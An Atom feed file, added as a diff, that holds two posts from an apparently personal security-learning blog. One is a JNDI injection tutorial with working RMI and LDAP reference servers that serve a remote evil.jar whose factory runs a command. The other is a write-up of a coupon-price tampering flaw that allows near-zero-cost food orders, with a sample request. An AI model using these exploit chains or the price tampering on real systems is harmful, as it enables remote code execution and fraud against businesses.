@@ -1,0 +1,520 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://xyuxu23.github.io</id>
+    <title>Xyuxu</title>
+    <updated>2025-11-27T10:53:57.749Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://xyuxu23.github.io"/>
+    <link rel="self" href="https://xyuxu23.github.io/atom.xml"/>
+    <subtitle>温故而知新</subtitle>
+    <logo>https://xyuxu23.github.io/images/avatar.png</logo>
+    <icon>https://xyuxu23.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2025, Xyuxu</rights>
+    <entry>
+        <title type="html"><![CDATA[JNDI基础]]></title>
+        <id>https://xyuxu23.github.io/GD75xamwMe/</id>
+        <link href="https://xyuxu23.github.io/GD75xamwMe/">
+        </link>
+        <updated>2025-11-27T08:50:59.000Z</updated>
+        <content type="html"><![CDATA[<p>JNDI(Java Naming and Directory Interface) 是Java提供的Java 命名和目录接口。通过调用JNDI的API应用程序可以定位资源和其他程序对象。</p>
+<p>JNDI是Java EE的重要部分，可访问的现有的目录及服务有:JDBC、DNS、RMI、LDAP等等</p>
+<p><strong>Naming Service 命名服务：</strong></p>
+<p>命名服务将名称和对象进行关联，提供通过名称找到对象的操作，例如：DNS系统将计算机名和IP地址进行关联、文件系统将文件名和文件句柄进行关联等等。</p>
+<p><strong>Directory Service 目录服务：</strong></p>
+<p>目录服务是命名服务的扩展，除了提供名称和对象的关联，<strong>还允许对象具有属性</strong>。目录服务中的对象称之为目录对象。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。</p>
+<p><strong>Reference 引用：</strong></p>
+<p>在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用。引用包含了如何访问实际对象的信息。</p>
+<h1 id="IIX5V">JNDI目录服务</h1>
+<h2 id="CwbkQ">JNDI-DNS解析</h2>
+接下来先来讲讲JNDI的基本使用，Jndi调用DNS服务
+<pre><code class="language-java">package com.xyuxu.javasec.JNDI;
+
+import javax.naming.Context;
+import javax.naming.directory.Attributes;
+import javax.naming.directory.DirContext;
+import javax.naming.directory.InitialDirContext;
+import java.util.Hashtable;
+
+public class DnsContextFactory {
+
+    public static void main(String[] args) throws Exception {
+
+        Hashtable env = new Hashtable&lt;&gt;();
+        env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.dns.DnsContextFactory&quot;);
+        env.put(Context.PROVIDER_URL,&quot;dns://8.8.8.8/&quot;);
+
+        DirContext dirContext = new InitialDirContext(env);
+        Attributes attrs = dirContext.getAttributes(&quot;baidu.com&quot;,new String[]{&quot;TXT&quot;});
+        Attributes attrs1 = dirContext.getAttributes(&quot;google.com&quot;,new String[]{&quot;TXT&quot;});
+        System.out.println(attrs);
+        System.out.println(attrs1);
+
+    }
+}
+
+</code></pre>
+<p>运行结果</p>
+<figure data-type="image" tabindex="1"><img src="https://xyuxu23.github.io/post-images/1764233622623.png" alt="" loading="lazy"></figure>
+<p>常见的DNS记录类型还有：</p>
+<ul>
+<li>&quot;AAAA&quot;: IPv6地址记录</li>
+<li>&quot;MX&quot;: 邮件交换记录</li>
+<li>&quot;TXT&quot;: 文本记录，常用于SPF、DKIM等</li>
+<li>&quot;NS&quot;: 域名服务器记录</li>
+<li>&quot;CNAME&quot;: 规范名称记录，即别名</li>
+<li>&quot;PTR&quot;: 指针记录，用于反向DNS查找</li>
+</ul>
+<h2 id="LLiBX">JNDI-RMI远程方法调用</h2>
+JNDI调用RMI服务
+<p>首先创建一个RMIServer，RMI对象引用要有一个继承Remote的接口 ，然后还需要实现一个类继承这个接口，然后继承 <font style="color:#080808;background-color:#ffffff;">UnicastRemoteObject 这个类。</font></p>
+<p><font style="color:#080808;background-color:#ffffff;">远程对象接口</font></p>
+<pre><code class="language-java">package com.xyuxu.javasec.RMI;
+
+import java.rmi.Remote;
+import java.rmi.RemoteException;
+
+public interface IRemoteObj extends Remote {
+
+    public String sayHello() throws  RemoteException;
+    public String sayHello(Object name) throws RemoteException;
+    public String sayGoodbye()  throws RemoteException;
+
+}
+
+</code></pre>
+<p>远程对象类</p>
+<pre><code class="language-java">package com.xyuxu.javasec.RMI;
+
+import java.rmi.RemoteException;
+import java.rmi.server.UnicastRemoteObject;
+
+public class IRemoteObjImpl extends UnicastRemoteObject implements IRemoteObj {
+
+    public IRemoteObjImpl() throws RemoteException {
+    }
+
+    @Override
+    public String sayHello() {
+        return &quot;Hello,My Friend!&quot;;
+    }
+
+    @Override
+    public String sayHello(Object name) throws RemoteException {
+
+        return name.getClass().getName();
+    }
+
+    @Override
+    public String sayGoodbye() throws RemoteException {
+        return &quot;Goodbye,My Friend!&quot;;
+    }
+
+}
+
+</code></pre>
+<p>RMI服务端到此就创建成功了。</p>
+<pre><code class="language-java">package com.xyuxu.javasec.RMI;
+
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class RMIServer {
+
+    public static void main(String[] args) throws Exception {
+
+        IRemoteObj remoteObj=new IRemoteObjImpl();
+        Registry registry = LocateRegistry.createRegistry(1099);
+        registry.bind(&quot;remoteObj&quot;, remoteObj);
+        System.out.println(&quot;RMI server start at : 127.0.0.1:1099 &quot;);
+    }
+}
+
+</code></pre>
+<p>JNDI RMI客户端</p>
+<pre><code class="language-java">package com.xyuxu.javasec.JNDI;
+
+import com.xyuxu.javasec.RMI.IRemoteObj;
+
+import javax.naming.InitialContext;
+
+public class RMIRegistryContextFactory {
+
+    public static void main(String[] args) throws Exception {
+        //原始JDNI调用RMI
+//        String provideURL=&quot;rmi://127.0.0.1:1099&quot;;
+//        Hashtable env=new Hashtable();
+//        env.put(Context.INITIAL_CONTEXT_FACTORY,&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);
+//        env.put(Context.PROVIDER_URL,provideURL);
+//
+//
+//        DirContext dirContext=new InitialDirContext(env);
+//        IRemoteObj remoteObj=(IRemoteObj)dirContext.lookup(&quot;remoteObj&quot;);
+
+        //JNDI支持协议支持转换,可以简化为:
+        InitialContext initialContext = new InitialContext();
+        IRemoteObj remoteObj= (IRemoteObj) initialContext.lookup(&quot;rmi://127.0.0.1:1099/remoteObj&quot;);
+
+        String out=remoteObj.sayHello();
+        System.out.println(out);
+
+    }
+
+}
+
+</code></pre>
+<p>执行结果：</p>
+<figure data-type="image" tabindex="2"><img src="https://xyuxu23.github.io/post-images/1764233682629.png" alt="" loading="lazy"></figure>
+<p>可以对比一下原始RMI客户端的实现：</p>
+<pre><code class="language-java">package com.xyuxu.javasec.RMI;
+
+import java.rmi.NotBoundException;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class RMIClient {
+
+    public static void main(String[] args) throws RemoteException, NotBoundException {
+
+        Registry registry= LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);
+        IRemoteObj remoteObj=(IRemoteObj)registry.lookup(&quot;remoteObj&quot;);
+        System.out.println(remoteObj.sayHello());
+    }
+}
+</code></pre>
+<h1 id="ngpXJ">JNDI协议转换</h1>
+如果`JNDI`在`lookup`时没有指定初始化工厂名称，会自动根据协议类型动态查找内置的工厂类然后创建处理对应的服务请求。  `JNDI`默认支持自动转换的协议有：  
+<table>
+<thead>
+<tr>
+<th>协议名称</th>
+<th>协议URL</th>
+<th>Context类</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>DNS协议</td>
+<td><code>dns://</code></td>
+<td><code>com.sun.jndi.url.dns.dnsURLContext</code></td>
+</tr>
+<tr>
+<td>RMI协议</td>
+<td><code>rmi://</code></td>
+<td><code>com.sun.jndi.url.rmi.rmiURLContext</code></td>
+</tr>
+<tr>
+<td>LDAP协议</td>
+<td><code>ldap://</code></td>
+<td><code>com.sun.jndi.url.ldap.ldapURLContext</code></td>
+</tr>
+<tr>
+<td>LDAP协议</td>
+<td><code>ldaps://</code></td>
+<td><code>com.sun.jndi.url.ldaps.ldapsURLContextFactory</code></td>
+</tr>
+<tr>
+<td>IIOP对象请求代理协议</td>
+<td><code>iiop://</code></td>
+<td><code>com.sun.jndi.url.iiop.iiopURLContext</code></td>
+</tr>
+<tr>
+<td>IIOP对象请求代理协议</td>
+<td><code>iiopname://</code></td>
+<td><code>com.sun.jndi.url.iiopname.iiopnameURLContextFactory</code></td>
+</tr>
+<tr>
+<td>IIOP对象请求代理协议</td>
+<td><code>corbaname://</code></td>
+<td><code>com.sun.jndi.url.corbaname.corbanameURLContextFactory</code></td>
+</tr>
+</tbody>
+</table>
+<p>RMI示例:</p>
+<pre><code class="language-java">// 创建JNDI目录服务上下文
+InitialContext context = new InitialContext();
+
+// 查找JNDI目录服务绑定的对象
+Object obj = context.lookup(&quot;rmi://127.0.0.1:9527/test&quot;);
+</code></pre>
+<h1 id="UFAsy">JNDI-Reference</h1>
+在`JNDI`服务中允许使用系统以外的对象，比如在某些目录服务中直接引用远程的Java对象，但遵循一些安全限制。  
+<h2 id="VCZSC">RMI/LDAP远程对象引用安全限制</h2>
+<ol>
+<li>
+<p>在RMI服务中引用远程对象将受本地Java环境限制即本地的java.rmi.server.useCodebaseOnly配置必须为false(允许加载远程对象)，如果该值为true则禁止引用远程对象。</p>
+</li>
+<li>
+<p>被引用的ObjectFactory对象还将受到com.sun.jndi.rmi.object.trustURLCodebase配置限制，如果该值为false(不信任远程引用对象)一样无法调用远程的引用对象。</p>
+</li>
+<li>
+<p>JDK 5 U45,JDK 6 U45,JDK 7u21,JDK 8u121开始java.rmi.server.useCodebaseOnly默认配置已经改为了true。</p>
+</li>
+<li>
+<p>JDK 6u132, JDK 7u122, JDK 8u113开始com.sun.jndi.rmi.object.trustURLCodebase默认值已改为了false。</p>
+</li>
+<li>
+<p>LDAP在JDK 11.0.1、8u191、7u201、6u211后也将默认的com.sun.jndi.ldap.object.trustURLCodebase设置为了false。</p>
+</li>
+</ol>
+<p>本地测试远程对象引用可以使用如下方式允许加载远程的引用对象：</p>
+<pre><code class="language-java">System.setProperty(&quot;java.rmi.server.useCodebaseOnly&quot;, &quot;false&quot;);
+System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);
+</code></pre>
+<h2 id="mIeWy">创建恶意的ObjectFactory对象</h2>
+<p>JNDI允许通过对象工厂 (javax.naming.spi.ObjectFactory)动态加载对象实现，</p>
+<p>对象工厂必须实现 javax.naming.spi.ObjectFactory接口并重写getObjectInstance方法。</p>
+<p><strong>ReferenceObjectFactory示例代码：</strong></p>
+<pre><code class="language-java">package com.xyuxu.javasec.JNDI;
+
+import javax.naming.Context;
+import javax.naming.Name;
+import javax.naming.spi.ObjectFactory;
+import java.util.Hashtable;
+
+public class ReferenceObjectFactory implements ObjectFactory {
+    @Override
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception {
+        return Runtime.getRuntime().exec(&quot;calc&quot;);
+    }
+}
+</code></pre>
+<pre><code class="language-java">javac -encoding UTF-8  ./ReferenceObjectFactory.java    //编译成Class文件
+jar cvf  evil.jar  ./RefereceObjectFactory.class 	// 编译成Jar包
+</code></pre>
+<h2 id="yj3al">创建恶意的RMI服务</h2>
+<p>如果我们在RMI服务端绑定一个恶意的引用对象，RMI客户端在获取服务端绑定的对象时发现是一个Refence对象后，就会检查当前JVM是否允许加载远程引用对象。如果允许加载且本地不存在此对象工厂类则使用URLClassLoader加载远程的jar，并加载我们构建的恶意对象工厂(ReferenceObjectFactory)类然后后调用其中的getObjectInstance方法从而触发该方法中的恶意RCE代码。</p>
+<p>通俗来讲也就是</p>
+<p><strong>包含恶意攻击的RMI服务端代码：</strong></p>
+<pre><code class="language-java">package com.xyuxu.javasec.JNDI;
+
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+
+import javax.naming.Reference;
+import java.rmi.Naming;
+import java.rmi.registry.LocateRegistry;
+public class RMIReferenceServer {
+
+    public static void main(String[] args) throws Exception {
+
+        String url=&quot;http://test.xyuxu.top/evil.jar&quot;;
+        String className=&quot;com.xyuxu.javasec.JNDI.ReferenceObjectFactory&quot;;
+        LocateRegistry.createRegistry(1099);
+
+        //Reference对象
+        Reference reference = new Reference(className, className, url);
+        ReferenceWrapper referenceWrapper=new ReferenceWrapper(reference);
+
+        //如果RMI服务绑定的是Reference工厂对象,那么在调用的时候，会调用工厂得到的类
+        Naming.bind(&quot;rmi://127.0.0.1:1099/remoteObj&quot;,referenceWrapper);
+
+        System.out.printf(&quot;RMI Server Started\n:rmi://127.0.0.1:1099/remoteObj&quot;);
+    }
+
+}
+
+</code></pre>
+<p>客户端代码</p>
+<pre><code class="language-java">package com.xyuxu.javasec.JNDI;
+
+import javax.naming.InitialContext;
+
+public class RMIReferenceClient {
+
+    public static void main(String[] args) throws Exception {
+        InitialContext initialContext = new InitialContext();
+        Object obj =initialContext.lookup(&quot;rmi://127.0.0.1:1099/remoteObj&quot;);
+        System.out.println(&quot;obj =&quot; + obj);
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://xyuxu23.github.io/post-images/1764233727181.png" alt="" loading="lazy"></figure>
+<h2 id="iFhsl">创建恶意LDAP服务</h2>
+LDAP服务:
+<pre><code class="language-java">package com.xyuxu.javasec.JNDI;
+
+import com.unboundid.ldap.listener.InMemoryDirectoryServer;
+import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+import com.unboundid.ldap.sdk.Entry;
+import com.unboundid.ldap.sdk.LDAPResult;
+import com.unboundid.ldap.sdk.ResultCode;
+
+import javax.net.ServerSocketFactory;
+import javax.net.SocketFactory;
+import javax.net.ssl.SSLSocketFactory;
+import java.net.InetAddress;
+
+public class LDAPReferenceServer {
+
+    public static final int SERVER_PORT = 3000;
+    public static final String BIND_HOST =&quot;127.0.0.1&quot;;
+    public static final String LDAP_ENTRY_NAME=&quot;sec&quot;;
+    public static String LDAP_URL=&quot;ldap://&quot;+BIND_HOST+&quot;:&quot;+SERVER_PORT+&quot;/&quot;+LDAP_ENTRY_NAME;
+
+    //恶意远程jar,包含恶意攻击对象的工厂类
+    public static final String REMOTE_REFERENCE_JAR =&quot;http://test.xyuxu.top/evil.jar&quot;;
+
+    private static final String LDAP_BASE=&quot;dc=javasec,dc=xyuxu&quot;;
+
+    public static void main(String[] args) throws Exception {
+
+        InMemoryDirectoryServerConfig config =new InMemoryDirectoryServerConfig(LDAP_BASE);
+
+        config.setListenerConfigs(new InMemoryListenerConfig(
+                &quot;listen&quot;, InetAddress.getByName(BIND_HOST),SERVER_PORT,
+                ServerSocketFactory.getDefault(), SocketFactory.getDefault(),
+                (SSLSocketFactory) SSLSocketFactory.getDefault()
+        ));
+
+        // 添加自定义的LDAP操作拦截器
+        config.addInMemoryOperationInterceptor(new OperationInterceptor());
+
+        // 创建LDAP服务对象
+        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
+
+        // 启动服务
+        ds.startListening();
+
+        System.out.println(&quot;LDAP服务启动成功,服务地址：&quot; + LDAP_URL);
+
+    }
+
+
+    private static class OperationInterceptor extends InMemoryOperationInterceptor {
+
+        @Override
+        public void processSearchResult(InMemoryInterceptedSearchResult result) {
+            String base = result.getRequest().getBaseDN();
+            Entry entry = new Entry(base);
+
+            try {
+                // 设置对象的工厂类名
+                String className = &quot;com.xyuxu.javasec.JNDI.ReferenceObjectFactory&quot;;
+                entry.addAttribute(&quot;javaClassName&quot;, className);
+                entry.addAttribute(&quot;javaFactory&quot;, className);
+
+                // 设置远程的恶意引用对象的jar地址
+                entry.addAttribute(&quot;javaCodeBase&quot;, REMOTE_REFERENCE_JAR);
+
+                // 设置LDAP objectClass
+                entry.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);
+
+                result.sendSearchEntry(entry);
+                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+            } catch (Exception e1) {
+                e1.printStackTrace();
+            }
+        }
+
+
+    }
+
+}
+
+</code></pre>
+<p>JNDI LDAP客户端</p>
+<pre><code class="language-java">package com.xyuxu.javasec.JNDI;
+
+import javax.naming.InitialContext;
+
+import static com.xyuxu.javasec.JNDI.LDAPReferenceServer.LDAP_URL;
+
+public class LDAPReferenceClient {
+
+    public static void main(String[] args) throws Exception {
+
+        InitialContext ctx = new InitialContext();
+        Object obj=ctx.lookup(LDAP_URL);
+        System.out.println(obj);
+    }
+}
+
+</code></pre>
+<p>运行结果:</p>
+<figure data-type="image" tabindex="4"><img src="https://xyuxu23.github.io/post-images/1764233750091.png" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[汉堡白吃？某连锁餐饮 App 竟藏"0元购"漏洞！]]></title>
+        <id>https://xyuxu23.github.io/hanbaobaichi/</id>
+        <link href="https://xyuxu23.github.io/hanbaobaichi/">
+        </link>
+        <updated>2025-11-26T09:36:18.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="前言">前言</h1>
+<p>作为一名日常喜欢点外卖、又喜欢吃汉堡的苦逼大学生，我最近在某汉堡连锁店的点餐小程序里，发现了一个支付逻辑漏洞，可以实现0元购。当然，作为有职业道德修养的大学生，发现后第一时间上报了平台并协助修复。</p>
+<h1 id="正文">正文</h1>
+<p>在开始之前，我们先看看正常的支付流程是怎么走的。一般来说餐饮系统是这个点单逻辑：</p>
+<p>1. 选择商品（如汉堡+可乐套餐）→ 点击&quot;立即购买&quot;<br>
+   2. 填写收货地址 / 选择到店自提<br>
+   3. 进入订单确认页显示总价、优惠券、实付金额等<br>
+   4. 点击&quot;去支付&quot;→ 跳转至第三方支付平台（如微信 / 支付宝）<br>
+   5. 支付完成后跳转回 App，订单状态变为&quot;待接单&quot;或&quot;已支付&quot;</p>
+<p>在常规的支付逻辑中，后端应该对以下关键字段进行强校验：</p>
+<p>1. 商品价格必须由后台计算，不可信任前端提交的数据<br>
+ 2. 支付状态必须依赖第三方支付平台的真实回调<br>
+ 3. 优惠券使用逻辑必须绑定用户、状态、过期时间，并严格控制数量<br>
+但很多时候，开发为了&quot;快速上线&quot;，往往在这些地方埋下隐患……这时候就是我们趁虚而入的时候喽，也就是在计算商品价格，或者是提交dopay的时候尝试改敏感字段。</p>
+<p>通常来说敏感字段有这些：</p>
+<pre><code class="language-json">productid 
+price 
+count 
+discount 
+couponPrice 
+payType 
+payStatus
+finalAmount 
+</code></pre>
+<p>经过分析这个小程序计算购物车价格都是在后端，也做了价格的校验。数据包直接发过去商品id 购物车id ，然后计算。所以修改数据包价格是没有用的，关键在于提交支付的时候有一个submit接口。</p>
+<pre><code class="language-json">{
+&quot;memberId&quot;:&quot;2336182439538851840&quot;,
+&quot;openId&quot;:&quot;&quot;,
+&quot;storeId&quot;:&quot;1162731767332864&quot;,
+&quot;orderFrom&quot;:1,
+&quot;orderType&quot;:2,
+&quot;userCouponId&quot;:&quot;&quot;,
+&quot;couponCode&quot;:&quot;&quot;,
+&quot;paymentCode&quot;:1,
+&quot;receiverName&quot;:&quot;磊&quot;,
+&quot;receiverMobile&quot;:&quot;&quot;,
+&quot;receiverAddress&quot;:&quot;&quot;,
+&quot;remark&quot;:&quot;&quot;,
+&quot;latitude&quot;:,
+&quot;longitude&quot;:,
+&quot;carList&quot;:
+ [{&quot;spuId&quot;:&quot;1259209795738820608&quot;,
+   &quot;skuId&quot;:&quot;1259209795780763648&quot;,
+   &quot;flavorList&quot;:[],
+   &quot;condimentsList&quot;:[],
+   &quot;copies&quot;:1,
+   &quot;setmealType&quot;:2,
+   &quot;singleList&quot;:
+     [
+     {&quot;1264812338473361408&quot;:1},
+     {&quot;1264812338800517120&quot;:1},
+     {&quot;1264812339119284224&quot;:1},
+     {&quot;1264812339446439936&quot;:1}],
+     &quot;openId&quot;:&quot;oHVqn65MyJWgPAgf_z7CudMd_cp0&quot;,&quot;isPurchase&quot;:0}
+     ],
+   &quot;takeAwayTel&quot;:&quot;&quot;,
+   &quot;appointmentTime&quot;:&quot;立即取餐&quot;,
+   &quot;mainId&quot;:&quot;undefined&quot;
+}
+</code></pre>
+<p>然后就是dopay接口<br>
+<img src="https://xyuxu23.github.io/post-images/1764150430848.png" alt="" loading="lazy"><br>
+这里惯性思维肯定直接尝试直接修改dopay接口的价格，或者是同时下两个订单一个低一个高，直接改订单号替换支付，好吧都无果，全部都做了校验。然后这时候回头看Submit接口，有两个敏感字段 ：1.userCouponid 2.couponCode 那么有没有可能submit提交这里，可以伪造一个优惠券，然后提交上去，让服务端计算价格呢？<br>
+接着去burp里面找到了一个myCouponList接口，这里正好对应上了submit里面的信息可以填一下，但是这是我自己的优惠券，没什么卵用啊<br>
+<img src="https://xyuxu23.github.io/post-images/1764150541177.webp" alt="" loading="lazy"><br>
+接着找到了一个counponList的接口，发送的数据包里有一个counponPrice字段<br>
+<img src="https://xyuxu23.github.io/post-images/1764150633119.webp" alt="" loading="lazy"><br>
+根据前面的推测，submit接口可能是提交优惠券然后在后端计算价格。那么我们接着在submit的接口构造这个字段couponPrice为6，然后couponCode和ID直接置空试试</p>
+<p>成功了！dopay接口变成了11.5，然后发起了微信支付<br>
+<img src="https://xyuxu23.github.io/post-images/1764150692536.webp" alt="" loading="lazy"><br>
+后续尝试可以修改CouponPrice字段任意修改优惠券金额，最终实现0元购。这里我为什么没有0元购呢，因为我真的买了，0元购问题太明显....<br>
+<img src="https://xyuxu23.github.io/post-images/1764150707203.webp" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+</feed>
